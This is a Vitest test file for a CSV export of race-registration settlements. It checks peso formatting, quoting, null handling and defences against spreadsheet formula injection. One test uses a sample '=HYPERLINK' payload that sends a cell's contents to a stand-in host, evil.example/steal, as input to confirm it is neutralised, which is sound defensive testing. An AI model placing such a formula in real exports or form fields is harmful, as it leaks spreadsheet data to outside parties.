import { describe, it, expect } from "vitest";
import { settlementCsv, type SettlementRow } from "./settlement-csv";

const row = (over: Partial<SettlementRow> = {}): SettlementRow => ({
  registration_id: "r1", runner_name: "Ana Cruz", category: "40K",
  paid_at: "2026-08-01T02:00:00Z", method: "gcash",
  gross_paid: 200000, rp_commission: 6000, processing_fee: 3000, net_to_org: 191000,
  status: "paid", refunded_amount: 0, refunded_at: null, ...over,
});

describe("settlementCsv", () => {
  it("emits a header row followed by one row per registration", () => {
    const lines = settlementCsv([row()]).split("\n");
    expect(lines[0]).toBe(
      "registration_id,runner_name,category,paid_at,method,gross_paid,rp_commission,processing_fee,net_to_org,status,refunded_amount,refunded_at",
    );
    expect(lines).toHaveLength(2);
  });

  it("writes money in PESOS with two decimals, not centavos", () => {
    // A spreadsheet column of raw centavos gets read as pesos by a human and is
    // wrong by a factor of 100 — in a document about money owed.
    expect(settlementCsv([row()]).split("\n")[1]).toContain("2000.00,60.00,30.00,1910.00");
  });

  it("quotes and escapes a name containing a comma or a quote", () => {
    const csv = settlementCsv([row({ runner_name: 'Cruz, Ana "Bing"' })]);
    expect(csv.split("\n")[1]).toContain('"Cruz, Ana ""Bing"""');
  });

  it("renders a null paid_at and method as empty fields, not the string null", () => {
    const line = settlementCsv([row({ paid_at: null, method: null })]).split("\n")[1];
    expect(line).toBe("r1,Ana Cruz,40K,,,2000.00,60.00,30.00,1910.00,paid,0.00,");
  });

  it("emits only the header for an empty result", () => {
    expect(settlementCsv([]).split("\n")).toHaveLength(1);
  });
});

describe("CSV formula injection prevention", () => {
  it("prefixes with apostrophe when runner name starts with =", () => {
    const csv = settlementCsv([row({ runner_name: "=cmd" })]);
    expect(csv.split("\n")[1]).toContain("'=cmd");
  });

  it("prefixes with apostrophe when runner name starts with +", () => {
    const csv = settlementCsv([row({ runner_name: "+x" })]);
    expect(csv.split("\n")[1]).toContain("'+x");
  });

  it("prefixes with apostrophe when runner name starts with -", () => {
    const csv = settlementCsv([row({ runner_name: "-y" })]);
    expect(csv.split("\n")[1]).toContain("'-y");
  });

  it("prefixes with apostrophe when runner name starts with @", () => {
    const csv = settlementCsv([row({ runner_name: "@z" })]);
    expect(csv.split("\n")[1]).toContain("'@z");
  });

  it("prevents HYPERLINK injection with proper quoting and apostrophe", () => {
    const csv = settlementCsv([
      row({ runner_name: '=HYPERLINK("http://evil.example/steal?"&A1,"click")' }),
    ]);
    const line = csv.split("\n")[1];
    // Apostrophe prefix prevents formula execution; quotes are escaped
    expect(line).toContain("'=HYPERLINK");
    expect(line).toContain('""');
  });

  it("places apostrophe inside RFC 4180 quotes for formula injection defense", () => {
    const csv = settlementCsv([row({ runner_name: '=cmd,"x"' })]);
    const line = csv.split("\n")[1];
    // The apostrophe must be inside the quotes for this to work
    expect(line).toContain("\"'=cmd");
  });
});

describe("money field safety", () => {
  it("does not prefix negative money values with apostrophe", () => {
    const csv = settlementCsv([row({ net_to_org: -191000 })]);
    const line = csv.split("\n")[1];
    expect(line).toContain("-1910.00,paid");
  });

  it("does not prefix negative refunded amounts", () => {
    const csv = settlementCsv([row({ refunded_amount: -10000 })]);
    const line = csv.split("\n")[1];
    expect(line).toContain("paid,-100.00,");
  });
});

describe("character escaping regressions", () => {
  it("does not prefix or quote names with hyphens only in non-leading positions", () => {
    const csv = settlementCsv([row({ runner_name: "Ana-Maria Cruz" })]);
    expect(csv.split("\n")[1]).toContain("Ana-Maria Cruz");
  });

  it("correctly quotes and escapes runner names containing newlines", () => {
    const csv = settlementCsv([row({ runner_name: "\n" })]);
    // Should be quoted with the embedded newline preserved
    const expected = '"' + "\n" + '"';
    expect(csv).toContain(expected);
  });

  it("correctly escapes runner names containing only quotes", () => {
    const csv = settlementCsv([row({ runner_name: '"""' })]);
    // Three quotes become six (each doubled), then wrapped in quotes (8 total)
    expect(csv.split("\n")[1]).toContain('""""""""');
  });
});
